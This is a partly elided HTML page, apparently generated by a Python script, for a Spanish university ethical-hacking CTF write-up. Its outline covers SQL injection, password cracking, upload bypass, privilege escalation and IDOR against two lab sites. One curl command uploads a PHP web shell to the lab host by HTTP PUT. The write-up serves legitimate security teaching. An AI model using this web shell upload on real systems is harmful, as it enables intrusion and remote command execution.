...
<head>
  ...
  <title>SecDocs // Guía Definitiva de Hacking Ético & CTF Playbook</title>
...
<body class="bg-surface-canvas text-surface-text font-sans antialiased selection:bg-brand-600 selection:text-white transition-colors duration-200">
  ...
  <header class="fixed top-0 left-0 right-0 h-16 bg-surface-card/90 backdrop-blur-md border-b border-surface-border z-50 flex items-center justify-between px-4 lg:px-8">
    ...
    <div class="flex items-center gap-3">
      ...
      <div class="flex flex-col">
        <div class="flex items-center gap-2">
          <span class="font-bold text-lg tracking-tight text-surface-text">SecDocs</span>
          <span class="text-xs font-mono font-semibold px-2 py-0.5 rounded-full bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 border border-brand-200 dark:border-brand-800">CTF Lab 2026</span>
        </div>
        <span class="text-xs text-surface-muted hidden sm:inline-block">Universidad de La Guajira · Hacking Ético</span>
      </div>
    </div>
    ...
    <div class="flex items-center gap-3">
      <!-- Target status badge -->
      <div class="hidden lg:flex items-center gap-2 px-3 py-1 rounded-lg bg-emerald-50 text-emerald-700 dark:bg-emerald-950/40 dark:text-emerald-400 border border-emerald-200 dark:border-emerald-800 text-xs font-mono">
        <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
        <span>LAB ONLINE: 134.209.63.29</span>
      </div>
      ...
      <!-- GitHub Repo Link -->
      <a href="https://github.com/TheWiche/ethical-hacking-ctf-guide" target="_blank" rel="noopener" class="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-surface-inset hover:bg-surface-border text-surface-text text-sm font-medium transition-all" title="Ver repositorio en GitHub">
  ...
  <div class="pt-16 flex min-h-screen">
    ...
    <aside class="w-72 fixed top-16 bottom-0 left-0 bg-surface-card border-r border-surface-border overflow-y-auto px-4 py-6 hidden lg:block z-30">
      <div class="mb-4">
        <div class="flex items-center gap-2 pb-3 border-b border-surface-border">
          <span class="text-xs font-mono font-bold uppercase tracking-wider text-surface-muted">Temario & Fases</span>
        </div>
      </div>

      <nav class="space-y-6 text-sm">
        <!-- 00. General & Fundamentos -->
        <div>
          <span class="text-xs font-bold uppercase tracking-wider text-brand-600 dark:text-brand-400 block mb-2 font-mono">00. Fundamentos Teóricos</span>
          <ul class="space-y-1">
            <li><a href="#fundamentos" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">menu_book</span><span>OWASP Top 10 & HTTP</span></a></li>
            <li><a href="#metodologia" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">architecture</span><span>Cadena de Ataque</span></a></li>
          </ul>
        </div>

        <!-- 01. Sitio 1 -->
        <div>
          <span class="text-xs font-bold uppercase tracking-wider text-rose-600 dark:text-rose-400 block mb-2 font-mono">01. Sitio 1: TechNova Store (P80)</span>
          <ul class="space-y-1">
            <li><a href="#s1-fase1" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">travel_explore</span><span>1. Reconocimiento (Gobuster)</span></a></li>
            <li><a href="#s1-fase2" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">bug_report</span><span>2. Detección SQLi Booleano</span></a></li>
            <li><a href="#s1-fase3" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">database</span><span>3. Exfiltración UNION SQLi</span></a></li>
            <li><a href="#s1-fase4" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">key</span><span>4. Cracking MD5 (John)</span></a></li>
            <li><a href="#s1-fase5" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">upload_file</span><span>5. File Upload (MIME Bypass)</span></a></li>
            <li><a href="#s1-fase6" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">terminal</span><span>6. RCE & FLAG 1</span></a></li>
            <li><a href="#s1-fase7" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">admin_panel_settings</span><span>7. SUID & PATH Hijack (FLAG 2)</span></a></li>
          </ul>
        </div>

        <!-- 02. Sitio 2 -->
        <div>
          <span class="text-xs font-bold uppercase tracking-wider text-emerald-600 dark:text-emerald-400 block mb-2 font-mono">02. Sitio 2: Larm182 Solutions (P8080)</span>
          <ul class="space-y-1">
            <li><a href="#s2-fase8" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">info</span><span>8. Info Disclosure (phpinfo)</span></a></li>
            <li><a href="#s2-fase9" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">password</span><span>9. Fuerza Bruta (Hydra)</span></a></li>
            <li><a href="#s2-fase10" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">fingerprint</span><span>10. IDOR en Reportes</span></a></li>
            <li><a href="#s2-fase11" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">flag</span><span>11. Exfiltración FLAG Sitio 2</span></a></li>
            <li><a href="#s2-fase12" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">http</span><span>12. HTTP PUT Upload (Burp)</span></a></li>
            <li><a href="#s2-fase13" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">deployed_code</span><span>13. RCE & Variables de Entorno</span></a></li>
          </ul>
        </div>

        <!-- 03. Análisis & Marco Legal -->
        <div>
          <span class="text-xs font-bold uppercase tracking-wider text-purple-600 dark:text-purple-400 block mb-2 font-mono">03. Análisis & Normativa</span>
          <ul class="space-y-1">
    ...
    <main class="flex-1 lg:pl-72 max-w-full">
      <div class="max-w-5xl mx-auto px-4 sm:px-8 py-10 space-y-16">
        ...
        <!-- HERO BANNER -->
        <section class="relative overflow-hidden rounded-2xl bg-gradient-to-br from-brand-900 via-brand-800 to-slate-900 text-white p-8 sm:p-10 shadow-xl">
          <div class="relative z-10 max-w-3xl space-y-4">
            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/10 backdrop-blur-md text-brand-200 text-xs font-mono font-semibold border border-white/10">
              <span class="material-symbols-outlined text-[14px]">verified</span>
              <span>Laboratorio Evaluativo Oficial · 100 Puntos</span>
            </div>
            <h1 class="text-3xl sm:text-4xl font-extrabold tracking-tight">
              CTF: Reconocimiento, Explotación & Análisis de Vulnerabilidades Web
            </h1>
            <p class="text-brand-100 text-base sm:text-lg leading-relaxed font-normal">
              Guía técnica exhaustiva y bitácora forense de auditoría ofensiva sobre dos escenarios de producción: <strong>TechNova Store (Puerto 80)</strong> y <strong>Larm182 Solutions (Puerto 8080)</strong>. Cobertura completa del estándar OWASP Top 10:2021, escalada de privilegios y análisis de mitigaciones.
            </p>
            <div class="flex flex-wrap items-center gap-4 pt-4 text-xs font-mono text-brand-200">
              <div class="flex items-center gap-1.5"><span class="material-symbols-outlined text-[16px]">person</span><span>Auditor: Nelson Wilinton Cotes Yepez</span></div>
              <div class="flex items-center gap-1.5"><span class="material-symbols-outlined text-[16px]">badge</span><span>Código: 0182210015</span></div>
              <div class="flex items-center gap-1.5"><span class="material-symbols-outlined text-[16px]">school</span><span>Docente: Luis Ángel Ramírez Mendoza</span></div>
            </div>
          </div>
        ...
        <section id="matriz-owasp" class="space-y-6 pt-6">
          ...
          <div class="overflow-x-auto rounded-xl border border-surface-border bg-surface-card shadow-xs">
            <table class="w-full text-left text-xs text-surface-muted">
              <thead class="bg-brand-900 text-white font-mono uppercase text-[11px] tracking-wider">
                <tr>
...
curl -X PUT "http://134.209.63.29:8080/api/subir.php?nombre=shell.php" -H "Cookie: PHPSESSID=..." --data '&lt;?php system($_GET["cmd"]); ?&gt;'</code></pre>
        ...
        <footer class="pt-10 border-t border-surface-border text-center text-xs text-surface-muted space-y-2">
          ...
          <p>Documento de auditoría académica y defensiva elaborado por <strong>Nelson Wilinton Cotes Yepez</strong> (Cód. 0182210015)</p>
          <p class="font-mono text-[11px] text-surface-muted pt-1">Inspirado en el sistema de diseño SecDocs de Google Stitch</p>
        </footer>
...
out_path = r"c:\Users\cotes\Documents\Proyectos U\Hacking_Etico\Corte 1\ethical-hacking-guide\index.html"
with open(out_path, "w", encoding="utf-8") as f:
    f.write(html_content)

print(f"Generated web documentation portal at: {out_path}")
